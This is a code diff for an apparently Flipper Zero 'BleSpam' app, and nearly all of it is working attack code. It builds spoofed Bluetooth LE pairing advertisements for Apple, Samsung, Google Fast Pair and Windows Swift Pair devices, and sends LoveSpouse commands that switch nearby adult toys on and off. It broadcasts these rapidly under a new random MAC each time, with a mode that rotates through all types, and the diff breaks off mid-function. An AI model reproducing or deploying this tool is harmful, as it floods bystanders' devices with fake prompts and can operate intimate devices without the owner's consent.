@@ -1,551 +1,434 @@
 #include <furi.h>
-#include <furi_hal.h>
-#include <furi_hal_bt.h>
-#include <furi_hal_random.h>
 #include <gui/gui.h>
-#include <gui/view.h>
 #include <gui/view_dispatcher.h>
 #include <gui/elements.h>
-#include <stdlib.h>
+#include <furi_hal_bt.h>
+#include <furi_hal_light.h>
+#include <furi_hal_random.h>
+#include <extra_beacon.h>
 #include <string.h>
 
 #include "esp_boost.h"
 
-#define TAG "BleSpam"
-
-// --- Device types ---
-typedef enum {
-    TypeApplePP,    // Continuity ProximityPair
-    TypeAppleNA,    // Continuity NearbyAction
-    TypeSamsungBuds,
-    TypeSamsungWatch,
-    TypeFastPair,
-    TypeSwiftPair,
-    TypeLovePlay,
-    TypeLoveStop,
-    TypeRotate,
-} DevType;
+// ── Device list ───────────────────────────────────────────────────────────
+typedef enum { TypeApplePair, TypeAppleAction, TypeSamsung, TypeSamsungWatch, TypeAndroid, TypeWindows, TypeLovePlay, TypeLoveStop, TypeRotate } DevType;
 
 typedef struct {
     const char* name;
     DevType type;
-    union {
-        uint16_t pp_model;      // Apple PP: 2-byte model
-        uint8_t na_action;      // Apple NA: action byte
-        uint32_t buds_model;    // Samsung Buds: 3-byte model
-        uint8_t watch_model;    // Samsung Watch: 1-byte model
-    };
-} DevEntry;
+    uint32_t param;
+    uint8_t extra; // prefix for Pair, flags for Action
+} Dev;
 
-// Apple Proximity Pair models (from Xtreme/Momentum source)
-// Apple Nearby Action types (from furiousMAC/continuity)
-// Samsung EasySetup models (from Spooks4576)
-
-static const DevEntry devs[] = {
-    // Apple Proximity Pair
-    {"AirPods",             TypeApplePP, .pp_model = 0x0220},
-    {"AirPods 2",           TypeApplePP, .pp_model = 0x0F20},
-    {"AirPods 3",           TypeApplePP, .pp_model = 0x1320},
-    {"AirPods Pro",         TypeApplePP, .pp_model = 0x0E20},
-    {"AirPods Pro 2",       TypeApplePP, .pp_model = 0x1420},
-    {"AirPods Max",         TypeApplePP, .pp_model = 0x0A20},
-    {"Beats Flex",          TypeApplePP, .pp_model = 0x1020},
-    {"Beats Studio Buds",   TypeApplePP, .pp_model = 0x1120},
-    {"Beats Studio Buds+",  TypeApplePP, .pp_model = 0x1620},
-    {"Beats Solo 3",        TypeApplePP, .pp_model = 0x0620},
-    {"Beats Studio 3",      TypeApplePP, .pp_model = 0x0920},
-    {"Beats Fit Pro",       TypeApplePP, .pp_model = 0x1220},
-    {"Beats X",             TypeApplePP, .pp_model = 0x0520},
-    {"Powerbeats 3",        TypeApplePP, .pp_model = 0x0320},
-    {"Powerbeats Pro",      TypeApplePP, .pp_model = 0x0B20},
-    {"AirTag",              TypeApplePP, .pp_model = 0x0055},
-    {"Hermes AirTag",       TypeApplePP, .pp_model = 0x0030},
-    {"Apple Vision Pro",    TypeApplePP, .pp_model = 0x2420},
-
-    // Apple Nearby Action
-    {"Setup AppleTV",       TypeAppleNA, .na_action = 0x01},
-    {"Transfer Number",     TypeAppleNA, .na_action = 0x02},
-    {"Apple Watch",         TypeAppleNA, .na_action = 0x05},
-    {"Pair AppleTV",        TypeAppleNA, .na_action = 0x06},
-    {"Setup iPhone",        TypeAppleNA, .na_action = 0x09},
-    {"HomePod Setup",       TypeAppleNA, .na_action = 0x0B},
-    {"HomeKit AppleTV",     TypeAppleNA, .na_action = 0x0D},
-    {"AppleTV AutoFill",    TypeAppleNA, .na_action = 0x13},
-    {"AppleTV AudioSync",   TypeAppleNA, .na_action = 0x19},
-    {"AppleTV ColorBal",    TypeAppleNA, .na_action = 0x1E},
-    {"Join AppleTV?",       TypeAppleNA, .na_action = 0x20},
-    {"Apple Vision Pro",    TypeAppleNA, .na_action = 0x24},
-    {"AppleTV Connect..",   TypeAppleNA, .na_action = 0x27},
-    {"AppleID AppleTV?",    TypeAppleNA, .na_action = 0x2B},
-    {"Sign In Device",      TypeAppleNA, .na_action = 0x2F},
-
-    // Samsung Buds (3-byte model)
-    {"Samsung Buds Pro",    TypeSamsungBuds, .buds_model = 0xEE7A0C},
-    {"Samsung Buds 2",      TypeSamsungBuds, .buds_model = 0xEAAA17},
-    {"Samsung Buds Live",   TypeSamsungBuds, .buds_model = 0x850116},
-    {"Samsung Buds FE",     TypeSamsungBuds, .buds_model = 0x3D8F41},
-    {"Samsung Buds2 Purp",  TypeSamsungBuds, .buds_model = 0x39EA48},
-
-    // Samsung Watch (1-byte model)
-    {"Samsung Watch4 44",   TypeSamsungWatch, .watch_model = 0x04},
-    {"Samsung Watch5 44",   TypeSamsungWatch, .watch_model = 0x11},
-    {"Samsung Watch6 40",   TypeSamsungWatch, .watch_model = 0x1B},
-    {"Samsung Watch Ultra", TypeSamsungWatch, .watch_model = 0x15},
-
-    // Google Fast Pair
-    {"Android Fast Pair",   TypeFastPair, {0}},
-
-    // Windows Swift Pair
-    {"Windows Swift Pair",  TypeSwiftPair, {0}},
-
+static const Dev devs[] = {
+    // Apple Proximity Pair — exact backup format
+    {"AirPods",            TypeApplePair,   0x0220, 0x01},
+    {"AirPods 2",          TypeApplePair,   0x0F20, 0x01},
+    {"AirPods 3",          TypeApplePair,   0x1320, 0x01},
+    {"AirPods Pro",        TypeApplePair,   0x0E20, 0x01},
+    {"AirPods Pro 2",      TypeApplePair,   0x1420, 0x01},
+    {"AirPods Max",        TypeApplePair,   0x0A20, 0x01},
+    {"Beats Flex",         TypeApplePair,   0x1020, 0x01},
+    {"Beats Studio Buds",  TypeApplePair,   0x1120, 0x01},
+    {"Beats Studio Buds+", TypeApplePair,   0x1620, 0x01},
+    {"Beats Solo 3",       TypeApplePair,   0x0620, 0x01},
+    {"Beats Studio 3",     TypeApplePair,   0x0920, 0x01},
+    {"Beats Fit Pro",      TypeApplePair,   0x1220, 0x01},
+    {"Beats X",            TypeApplePair,   0x0520, 0x01},
+    {"Powerbeats 3",       TypeApplePair,   0x0320, 0x01},
+    {"Powerbeats Pro",     TypeApplePair,   0x0B20, 0x01},
+    {"AirTag",             TypeApplePair,   0x0055, 0x05},
+    {"Hermes AirTag",      TypeApplePair,   0x0030, 0x05},
+    // Apple Nearby Action — verified working
+    {"Apple Vision Pro",   TypeAppleAction, 0x24, 0xC0},
+    {"AppleTV Pair",       TypeAppleAction, 0x06, 0xC0},
+    {"Join AppleTV?",      TypeAppleAction, 0x20, 0xBF},
+    {"HomePod Setup",      TypeAppleAction, 0x0B, 0xC0},
+    {"Transfer Number",    TypeAppleAction, 0x02, 0xC0},
+    {"AppleTV Connect..",  TypeAppleAction, 0x27, 0xC0},
+    {"AppleTV ColorBal",   TypeAppleAction, 0x1E, 0xC0},
+    {"AppleID AppleTV?",   TypeAppleAction, 0x2B, 0xC0},
+    {"Sign In Device",     TypeAppleAction, 0x2F, 0xC0},
+    {"HomeKit AppleTV",    TypeAppleAction, 0x0D, 0xC0},
+    // Samsung
+    {"Samsung Buds Pro",   TypeSamsung,     0xB8B905, 0},
+    {"Samsung Buds 2",     TypeSamsung,     0xEAAA17, 0},
+    {"Samsung Buds Live",  TypeSamsung,     0x850116, 0},
+    {"Samsung Buds FE",    TypeSamsung,     0xEE7A0C, 0},
+    {"Samsung Buds2 Purp", TypeSamsung,     0x39EA48, 0},
+    {"Samsung Watch4 44",  TypeSamsungWatch,0x04, 0},
+    {"Samsung Watch5 44",  TypeSamsungWatch,0x11, 0},
+    {"Samsung Watch6 40",  TypeSamsungWatch,0x1B, 0},
+    {"Samsung Watch Ultra",TypeSamsungWatch,0x0C, 0},
+    // Android / Windows
+    {"Android Fast Pair",  TypeAndroid,     0, 0},
+    {"Windows Swift Pair", TypeWindows,     0, 0},
     // LoveSpouse
-    {"LoveSpouse Play",     TypeLovePlay, {0}},
-    {"LoveSpouse Stop",     TypeLoveStop, {0}},
-
+    {"LoveSpouse Play",    TypeLovePlay,    0, 0},
+    {"LoveSpouse Stop",    TypeLoveStop,    0, 0},
     // Rotate all
-    {"[ALL] Rotate",        TypeRotate, {0}},
+    {"[ALL] Rotate",       TypeRotate,      0, 0},
 };
+#define DEV_COUNT ((int)COUNT_OF(devs))
 
-#define DEV_COUNT (sizeof(devs) / sizeof(devs[0]))
+// ── Packet builders — exact backup format ─────────────────────────────────
 
-typedef struct {
-    int sel;
-    bool broadcasting;
-    bool ble_ok;
-    bool esp_connected;
-} BleSpamModel;
-
-typedef struct {
-    ViewDispatcher* vd;
-    View* view;
-    FuriThread* worker;
-    bool running;
-    int sel;
-    EspBoost* esp;
-} BleSpamApp;
-
-// --- Packet building (matches Xtreme/Momentum original) ---
-
-static uint8_t build_apple_pp(uint8_t* pkt, uint16_t model) {
+static uint8_t build_pair(uint8_t* p, uint16_t model, uint8_t prefix) {
     uint8_t i = 0;
-    uint8_t prefix;
-    if(model == 0x0055 || model == 0x0030)
-        prefix = 0x05; // AirTag
-    else
-        prefix = 0x01; // Not Your Device
-
-    pkt[i++] = 25 + 5; // Size (continuity_size + header overhead - 1)
-    pkt[i++] = 0xFF;    // AD Type: Manufacturer Specific
-    pkt[i++] = 0x4C;    // Apple company ID
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x07;    // Continuity Type: Proximity Pair
-    pkt[i++] = 0x19;    // Continuity Size (25)
-
-    pkt[i++] = prefix;
-    pkt[i++] = (model >> 8) & 0xFF;  // Device Model high
-    pkt[i++] = (model >> 0) & 0xFF;  // Device Model low
-    pkt[i++] = 0x55;                  // Status
-    pkt[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds battery
-    pkt[i++] = ((rand() % 8) << 4) + (rand() % 10);  // Case battery + charging
-    pkt[i++] = (rand() % 256);        // Lid open counter
-    pkt[i++] = 0x00;                  // Device color
-    pkt[i++] = 0x00;
-    furi_hal_random_fill_buf(&pkt[i], 16); // Encrypted payload
-    i += 16;
-
-    return i; // 31
+    p[i++] = 30; p[i++] = 0xFF; p[i++] = 0x4C; p[i++] = 0x00;
+    p[i++] = 0x07; p[i++] = 0x19;
+    if(prefix == 0x05) {
+        // AirTag — hardcoded model bytes from backup
+        p[i++] = 0x05;
+        p[i++] = (model >> 8) & 0xFF;
+        p[i++] = model & 0xFF;
+        p[i++] = 0x55;
+        furi_hal_random_fill_buf(&p[i], 19);
+    } else {
+        // Audio device — backup battery byte range: rand()%16
+        p[i++] = prefix;
+        p[i++] = (model >> 8) & 0xFF;
+        p[i++] = model & 0xFF;
+        p[i++] = 0x55;
+        p[i++] = ((rand() % 16) << 4) | (rand() % 16);
+        p[i++] = ((rand() % 16) << 4) | (rand() % 16);
+        p[i++] = rand() % 256;
+        p[i++] = 0x00; p[i++] = 0x00;
+        furi_hal_random_fill_buf(&p[i], 16);
+    }
+    return 31;
 }
 
-static uint8_t build_apple_na(uint8_t* pkt, uint8_t action) {
+static uint8_t build_action(uint8_t* p, uint8_t action, uint8_t flags) {
     uint8_t i = 0;
-    uint8_t flags = 0xC0;
-    if(action == 0x20 && rand() % 2) flags--; // Join AppleTV spam boost
-    if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched Setup New Device
-
-    pkt[i++] = 5 + 5;   // Size
-    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
-    pkt[i++] = 0x4C;     // Apple company ID
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x0F;     // Continuity Type: Nearby Action
-    pkt[i++] = 0x05;     // Continuity Size (5)
-
-    pkt[i++] = flags;    // Action flags
-    pkt[i++] = action;   // Action type
-    furi_hal_random_fill_buf(&pkt[i], 3); // Auth tag
-    i += 3;
-
-    return i; // 11
+    p[i++] = 10; p[i++] = 0xFF; p[i++] = 0x4C; p[i++] = 0x00;
+    p[i++] = 0x0F; p[i++] = 0x05;
+    p[i++] = flags; p[i++] = action;
+    furi_hal_random_fill_buf(&p[i], 3);
+    return 11;
 }
 
-static uint8_t build_samsung_buds(uint8_t* pkt, uint32_t model) {
+static uint8_t build_samsung(uint8_t* p, uint32_t model) {
+    // Willy-JL verified Samsung Buds EasySetup format (31 bytes)
     uint8_t i = 0;
-    pkt[i++] = 27;      // Size
-    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
-    pkt[i++] = 0x75;     // Samsung company ID
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x42;
-    pkt[i++] = 0x09;
-    pkt[i++] = 0x81;
-    pkt[i++] = 0x02;
-    pkt[i++] = 0x14;
-    pkt[i++] = 0x15;
-    pkt[i++] = 0x03;
-    pkt[i++] = 0x21;
-    pkt[i++] = 0x01;
-    pkt[i++] = 0x09;
-    pkt[i++] = (model >> 16) & 0xFF; // Model byte 0
-    pkt[i++] = (model >> 8) & 0xFF;  // Model byte 1
-    pkt[i++] = 0x01;
-    // Pad remaining to size 28
-    while(i < 28) pkt[i++] = 0x00;
-    return 28;
+    p[i++]=27; p[i++]=0xFF; p[i++]=0x75; p[i++]=0x00;
+    p[i++]=0x42; p[i++]=0x09; p[i++]=0x81; p[i++]=0x02;
+    p[i++]=0x14; p[i++]=0x15; p[i++]=0x03; p[i++]=0x21;
+    p[i++]=0x01; p[i++]=0x09;
+    p[i++]=(model>>16)&0xFF; p[i++]=(model>>8)&0xFF;
+    p[i++]=0x01; p[i++]=model&0xFF;
+    p[i++]=0x06; p[i++]=0x3C; p[i++]=0x94; p[i++]=0x8E;
+    p[i++]=0x00; p[i++]=0x00; p[i++]=0x00; p[i++]=0x00;
+    p[i++]=0xC7; p[i++]=0x00;
+    // Truncated second AD segment (Android fills rest with zeros)
+    p[i++]=16; p[i++]=0xFF; p[i++]=0x75;
+    return 31;
 }
 
-static uint8_t build_samsung_watch(uint8_t* pkt, uint8_t model) {
+static const uint32_t fp_models[] = {
+    0xCD8256,0x821F66,0xF52494,0xD446A7,0x2D7A23,
+    0x0E30C3,0x92BBBD,0x0577B1,0x05A9BC,0x00000C,
+};
+static uint8_t build_fastpair(uint8_t* p) {
+    uint32_t m = fp_models[rand() % COUNT_OF(fp_models)];
     uint8_t i = 0;
-    pkt[i++] = 14;      // Size
-    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
-    pkt[i++] = 0x75;     // Samsung company ID
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x01;
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x02;
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x01;
-    pkt[i++] = 0x01;
-    pkt[i++] = 0xFF;
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x43;
-    pkt[i++] = model;   // Watch model
-    return i; // 15
+    p[i++]=0x03; p[i++]=0x03; p[i++]=0x2C; p[i++]=0xFE;
+    p[i++]=0x06; p[i++]=0x16; p[i++]=0x2C; p[i++]=0xFE;
+    p[i++]=(m>>16)&0xFF; p[i++]=(m>>8)&0xFF; p[i++]=m&0xFF;
+    return 11;
 }
-
-static uint8_t build_fastpair(uint8_t* pkt) {
-    // Two AD structures like the original
-    uint32_t model = (rand() & 0xFFFFFF); // Random Fast Pair model
+static uint8_t build_swiftpair(uint8_t* p) {
+    // Willy-JL verified format: Microsoft company ID 0x0006
     uint8_t i = 0;
-
-    // AD structure 1: Service UUID List
-    pkt[i++] = 3;       // Size
-    pkt[i++] = 0x03;    // AD Type: Complete List of 16-bit Service UUIDs
-    pkt[i++] = 0x2C;    // Google FastPair UUID
-    pkt[i++] = 0xFE;
-
-    // AD structure 2: Service Data
-    pkt[i++] = 6;       // Size
-    pkt[i++] = 0x16;    // AD Type: Service Data
-    pkt[i++] = 0x2C;    // Google FastPair UUID
-    pkt[i++] = 0xFE;
-    pkt[i++] = (model >> 16) & 0xFF;
-    pkt[i++] = (model >> 8) & 0xFF;
-    pkt[i++] = (model >> 0) & 0xFF;
-
-    // AD structure 3: TX Power Level
-    pkt[i++] = 2;
-    pkt[i++] = 0x0A;    // AD Type: TX Power
-    pkt[i++] = 0x00;    // 0 dBm
-
-    return i; // 14
-}
-
-static uint8_t build_swiftpair(uint8_t* pkt) {
+    uint8_t name_len = 9;
     const char* name = "Flipper Z";
-    uint8_t name_len = strlen(name);
     uint8_t size = 7 + name_len;
-    uint8_t i = 0;
-
-    pkt[i++] = size - 1;
-    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
-    pkt[i++] = 0x06;     // Microsoft company ID
-    pkt[i++] = 0x00;
-    pkt[i++] = 0x03;     // Microsoft Beacon ID
-    pkt[i++] = 0x00;     // Beacon Sub Scenario
-    pkt[i++] = 0x80;     // Reserved RSSI
-    memcpy(&pkt[i], name, name_len);
-    i += name_len;
-
+    p[i++] = size - 1;
+    p[i++] = 0xFF; p[i++] = 0x06; p[i++] = 0x00;
+    p[i++] = 0x03; p[i++] = 0x00; p[i++] = 0x80;
+    memcpy(&p[i], name, name_len); i += name_len;
     return i;
 }
 
-static uint8_t build_packet(uint8_t* pkt, const DevEntry* dev) {
-    switch(dev->type) {
-    case TypeApplePP:
-        return build_apple_pp(pkt, dev->pp_model);
-    case TypeAppleNA:
-        return build_apple_na(pkt, dev->na_action);
-    case TypeSamsungBuds:
-        return build_samsung_buds(pkt, dev->buds_model);
-    case TypeSamsungWatch:
-        return build_samsung_watch(pkt, dev->watch_model);
-    case TypeFastPair:
-        return build_fastpair(pkt);
-    case TypeSwiftPair:
-        return build_swiftpair(pkt);
-    case TypeLovePlay:
-    case TypeLoveStop: {
-        uint8_t i = 0;
-        pkt[i++] = 0x08;
-        pkt[i++] = 0xFF;
-        pkt[i++] = 0x00;
-        pkt[i++] = 0x00;
-        pkt[i++] = 0x00;
-        pkt[i++] = 0x00;
-        pkt[i++] = 0x00;
-        pkt[i++] = 0x00;
-        pkt[i++] = 0x00;
-        return i;
-    }
-    default:
-        return 0;
-    }
+static uint8_t build_samsung_watch(uint8_t* p, uint8_t model) {
+    // Willy-JL verified Samsung Watch EasySetup format
+    uint8_t i = 0;
+    p[i++] = 14; p[i++] = 0xFF;
+    p[i++] = 0x75; p[i++] = 0x00;
+    p[i++] = 0x01; p[i++] = 0x00;
+    p[i++] = 0x02; p[i++] = 0x00;
+    p[i++] = 0x01; p[i++] = 0x01;
+    p[i++] = 0xFF; p[i++] = 0x00;
+    p[i++] = 0x00; p[i++] = 0x43;
+    p[i++] = model;
+    return 15;
 }
+
+static const uint32_t love_plays[] = {
+    0xE49C6C, 0xE7075E, 0xE68E4F, 0xE1313B, 0xE0B82A,
+    0xE32318, 0xE2AA09, 0xED5DF1, 0xECD4E0,
+};
+static const uint32_t love_stops[] = {
+    0xE5157D, 0xD5964C, 0xA5113F,
+};
+
+static uint8_t build_lovespouse(uint8_t* p, bool play) {
+    uint32_t mode = play
+        ? love_plays[rand() % COUNT_OF(love_plays)]
+        : love_stops[rand() % COUNT_OF(love_stops)];
+    uint8_t i = 0;
+    p[i++] = 2; p[i++] = 0x01; p[i++] = 0x1A;
+    p[i++] = 14; p[i++] = 0xFF;
+    p[i++] = 0xFF; p[i++] = 0x00;
+    p[i++] = 0x6D; p[i++] = 0xB6; p[i++] = 0x43; p[i++] = 0xCE;
+    p[i++] = 0x97; p[i++] = 0xFE; p[i++] = 0x42; p[i++] = 0x7C;
+    p[i++] = (mode >> 16) & 0xFF;
+    p[i++] = (mode >> 8) & 0xFF;
+    p[i++] = mode & 0xFF;
+    p[i++] = 3; p[i++] = 0x03; p[i++] = 0x8F; p[i++] = 0xAE;
+    return 22;
+}
+
+// ── ESP boost helper ─────────────────────────────────────────────────────
 
 static EspBoostCmd dev_type_to_esp_cmd(DevType type) {
     switch(type) {
-    case TypeApplePP:
-    case TypeAppleNA:
+    case TypeApplePair:
+    case TypeAppleAction:
         return EspBoostCmdApple;
-    case TypeSamsungBuds:
+    case TypeSamsung:
     case TypeSamsungWatch:
         return EspBoostCmdSamsung;
-    case TypeFastPair:
+    case TypeAndroid:
         return EspBoostCmdGoogle;
-    case TypeSwiftPair:
+    case TypeWindows:
         return EspBoostCmdWindows;
     default:
         return EspBoostCmdRandom;
     }
 }
 
-// --- BLE worker thread ---
+// ── App state ─────────────────────────────────────────────────────────────
+
+typedef struct {
+    ViewDispatcher* vd;
+    View* view;
+    volatile bool running;
+    FuriThread* worker;
+    int sel;      // current selected index
+    bool last_ok;
+    EspBoost* esp;
+} App;
+
+// ── Worker ────────────────────────────────────────────────────────────────
+
 static int32_t worker_fn(void* ctx) {
-    BleSpamApp* app = ctx;
-
-    GapExtraBeaconConfig config;
-    memset(&config, 0, sizeof(config));
-    config.adv_channel_map = GapAdvChannelMapAll;
-    config.adv_power_level = GapAdvPowerLevel_6dBm;
-    config.address_type = GapAddressTypeRandom;
-
-    int rotate_idx = 0;
+    App* app = ctx;
+    uint32_t c = 0;
+    bool rotate = (devs[app->sel].type == TypeRotate);
 
     while(app->running) {
-        int idx = app->sel;
-        if(devs[idx].type == TypeRotate) {
-            idx = rotate_idx;
-            rotate_idx = (rotate_idx + 1) % ((int)DEV_COUNT - 1);
+        const Dev* d = rotate ? &devs[c % (DEV_COUNT - 1)] : &devs[app->sel];
+
+        uint8_t mac[6];
+        furi_hal_random_fill_buf(mac, 6);
+        mac[0] = 0xC0 | (mac[0] & 0x3F);
+
+        GapExtraBeaconConfig cfg = {0};
+        cfg.min_adv_interval_ms = 20;
+        cfg.max_adv_interval_ms = 50;
+        cfg.adv_channel_map = GapAdvChannelMapAll;
+        cfg.adv_power_level = GapAdvPowerLevel_6dBm;
+        cfg.address_type = GapAddressTypeRandom;
+        memcpy(cfg.address, mac, 6);
+
+        uint8_t data[31] = {0};
+        uint8_t len = 31;
+        switch(d->type) {
+        case TypeApplePair:   len = build_pair(data, d->param, d->extra); break;
+        case TypeAppleAction: len = build_action(data, d->param, d->extra); break;
+        case TypeSamsung:     len = build_samsung(data, d->param); break;
+        case TypeSamsungWatch:len = build_samsung_watch(data, d->param); break;
+        case TypeAndroid:     len = build_fastpair(data); break;
+        case TypeWindows:     len = build_swiftpair(data); break;
+        case TypeLovePlay:    len = build_lovespouse(data, true); break;
+        case TypeLoveStop:    len = build_lovespouse(data, false); break;
+        default: break;
         }
-
-        const DevEntry* dev = &devs[idx];
-        uint8_t pkt[31];
-        uint8_t pkt_len = build_packet(pkt, dev);
-        if(pkt_len == 0) {
-            furi_delay_ms(100);
-            continue;
-        }
-
-        // Random MAC
-        furi_hal_random_fill_buf(config.address, 6);
-        config.address[5] = (config.address[5] & 0x3F) | 0xC0;
-
-        config.min_adv_interval_ms = 50;
-        config.max_adv_interval_ms = 75;
 
         furi_hal_bt_extra_beacon_stop();
-        bool ok = furi_hal_bt_extra_beacon_set_config(&config);
-        if(ok) ok = furi_hal_bt_extra_beacon_set_data(pkt, pkt_len);
-        if(ok) ok = furi_hal_bt_extra_beacon_start();
+        furi_hal_bt_extra_beacon_set_config(&cfg);
+        furi_hal_bt_extra_beacon_set_data(data, len);
 
-        with_view_model(
-            app->view,
-            BleSpamModel * m,
-            { m->ble_ok = ok; },
-            true);
+        bool ok = furi_hal_bt_extra_beacon_start();
+        app->last_ok = ok;
+        furi_hal_light_set(LightBlue, ok ? 0xFF : 0x00);
+        furi_hal_light_set(LightRed,  ok ? 0x00 : 0xFF);
 
-        if(ok) {
-            furi_hal_light_set(LightBlue, 0xFF);
-        } else {
-            furi_hal_light_set(LightRed, 0xFF);
-        }
-
-        furi_delay_ms(200);
-        furi_hal_light_set(LightBlue, 0x00);
-        furi_hal_light_set(LightRed, 0x00);
-        furi_delay_ms(50);
+        c++;
+        for(int i = 0; i < 5 && app->running; i++) furi_delay_ms(20);
     }
 
+    // Clean stop — double-stop + small delay to ensure BT stack is clean
     furi_hal_bt_extra_beacon_stop();
+    furi_delay_ms(20);
+    furi_hal_bt_extra_beacon_stop();
+    // Restore normal BT advertising if it was active before
+    if(furi_hal_bt_is_alive() && !furi_hal_bt_is_active()) {
+        furi_hal_bt_start_advertising();
+    }
+    furi_hal_light_set(LightBlue, 0x00);
+    furi_hal_light_set(LightRed, 0x00);
     return 0;
 }
 
-// --- Start / Stop ---
-static void do_start(BleSpamApp* app) {
-    if(app->running) return;
-    furi_hal_bt_stop_advertising();
-    app->running = true;
-    furi_thread_start(app->worker);
-
-    if(app->esp) {
-        EspBoostCmd cmd = dev_type_to_esp_cmd(devs[app->sel].type);
-        esp_boost_start(app->esp, cmd);
-    }
-
-    with_view_model(
-        app->view,
-        BleSpamModel * m,
-        { m->broadcasting = true; },
-        true);
-}
-
-static void do_stop(BleSpamApp* app) {
+static void do_stop(App* app) {
     if(!app->running) return;
     app->running = false;
-    furi_thread_join(app->worker);
-
-    furi_hal_bt_extra_beacon_stop();
-    furi_hal_bt_start_advertising();
-
-    if(app->esp) {
-        esp_boost_stop(app->esp);
+    if(app->worker) {
+        furi_thread_join(app->worker);
+        furi_thread_free(app->worker);
+        app->worker = NULL;
     }
-
+    furi_hal_bt_extra_beacon_stop();
     furi_hal_light_set(LightBlue, 0x00);
     furi_hal_light_set(LightRed, 0x00);
 
-    with_view_model(
-        app->view,
-        BleSpamModel * m,
-        { m->broadcasting = false; },
-        true);
+    // ESP32 boost stop
+    if(app->esp) esp_boost_stop(app->esp);
 }
 
-// --- Draw callback ---
-static void draw_cb(Canvas* canvas, void* model) {
-    BleSpamModel* m = model;
-
-    canvas_clear(canvas);
-    canvas_set_font(canvas, FontPrimary);
-
-    const char* title = m->esp_connected ? "BleSpam+ESP" : "BleSpam";
-    canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, title);
-
-    canvas_set_font(canvas, FontSecondary);
-    canvas_draw_str_aligned(canvas, 64, 16, AlignCenter, AlignTop, devs[m->sel].name);
-
-    char buf[32];
-    snprintf(buf, sizeof(buf), "%d / %d", m->sel + 1, (int)DEV_COUNT);
-    canvas_draw_str_aligned(canvas, 64, 28, AlignCenter, AlignTop, buf);
-
-    canvas_set_font(canvas, FontPrimary);
-    if(m->broadcasting) {
-        canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignTop, "Broadcasting");
-        canvas_set_font(canvas, FontSecondary);
-        canvas_draw_str_aligned(
-            canvas, 64, 52, AlignCenter, AlignTop, m->ble_ok ? "BLE:OK" : "BLE:ERR");
-    } else {
-        canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignTop, "Stopped");
-    }
-
-    elements_button_left(canvas, "< Prev");
-    elements_button_right(canvas, "Next >");
-    elements_button_center(canvas, m->broadcasting ? "STOP" : "START");
-}
-
-// --- Input callback ---
-static bool input_cb(InputEvent* event, void* ctx) {
-    BleSpamApp* app = ctx;
-    if(event->type != InputTypeShort && event->type != InputTypeLong) return false;
-
-    if(event->key == InputKeyOk) {
-        if(app->running)
-            do_stop(app);
-        else
-            do_start(app);
-        return true;
-    }
-
-    if(event->key == InputKeyLeft) {
-        bool was = app->running;
-        if(was) do_stop(app);
-        app->sel = (app->sel - 1 + (int)DEV_COUNT) % (int)DEV_COUNT;
-        with_view_model(
-            app->view, BleSpamModel * m, { m->sel = app->sel; }, true);
-        if(was) do_start(app);
-        return true;
-    }
-
-    if(event->key == InputKeyRight) {
-        bool was = app->running;
-        if(was) do_stop(app);
-        app->sel = (app->sel + 1) % (int)DEV_COUNT;
-        with_view_model(
-            app->view, BleSpamModel * m, { m->sel = app->sel; }, true);
-        if(was) do_start(app);
-        return true;
-    }
-
-    if(event->key == InputKeyBack) {
-        if(app->running) do_stop(app);
-        view_dispatcher_stop(app->vd);
-        return true;
-    }
-
-    return false;
-}
-
-// --- Main entry ---
-int32_t x_ble_spam_main(void* p) {
-    UNUSED(p);
-
-    BleSpamApp* app = malloc(sizeof(BleSpamApp));
-    memset(app, 0, sizeof(BleSpamApp));
-
-    // ESP32 boost init (NULL = not connected or UART busy, app works fine without it)
-    app->esp = esp_boost_init();
-
-    app->vd = view_dispatcher_alloc();
-    app->view = view_alloc();
-    view_allocate_model(app->view, ViewModelTypeLocking, sizeof(BleSpamModel));
-    view_set_draw_callback(app->view, draw_cb);
-    view_set_input_callback(app->view, input_cb);
-    view_set_context(app->view, app);
-
-    with_view_model(
-        app->view,
-        BleSpamModel * m,
-        {
-            m->sel = 0;
-            m->broadcasting = false;
-            m->ble_ok = false;
-            m->esp_connected = esp_boost_is_connected(app->esp);
-        },
-        true);
-
-    view_dispatcher_add_view(app->vd, 0, app->view);
-
-    Gui* gui = furi_record_open(RECORD_GUI);
-    view_dispatcher_attach_to_gui(app->vd, gui, ViewDispatcherTypeFullscreen);
-    view_dispatcher_switch_to_view(app->vd, 0);
-
+static void do_start(App* app) {
+    if(app->running || !furi_hal_bt_is_alive()) return;
+    if(furi_hal_bt_is_active()) furi_hal_bt_stop_advertising();
+    app->running = true;
     app->worker = furi_thread_alloc();
     furi_thread_set_name(app->worker, "BleSpam");
     furi_thread_set_stack_size(app->worker, 2048);
     furi_thread_set_callback(app->worker, worker_fn);
     furi_thread_set_context(app->worker, app);
+    furi_thread_start(app->worker);
 
+    // ESP32 boost start
+    if(app->esp) {
+        EspBoostCmd cmd = dev_type_to_esp_cmd(devs[app->sel].type);
+        esp_boost_start(app->esp, cmd);
+    }
+}
+
+// ── View ──────────────────────────────────────────────────────────────────
+
+typedef struct { bool running; int sel; bool ok; bool esp; } VM;
+
+static void draw_cb(Canvas* canvas, void* mv) {
+    VM* m = mv;
+    canvas_clear(canvas);
+
+    // Header
+    canvas_set_font(canvas, FontPrimary);
+    canvas_draw_str_aligned(canvas, 64, 8, AlignCenter, AlignCenter, devs[m->sel].name);
+
+    // Status
+    canvas_set_font(canvas, FontSecondary);
+    if(m->running) {
+        const char* status = m->ok ? "Broadcasting  BLE:OK" : "Broadcasting  BLE:ERR";
+        canvas_draw_str_aligned(canvas, 64, 22, AlignCenter, AlignCenter, status);
+    } else {
+        canvas_draw_str_aligned(canvas, 64, 22, AlignCenter, AlignCenter, "Stopped");
+    }
+
+    // Index + ESP indicator
+    char idx[32];
+    if(m->esp)
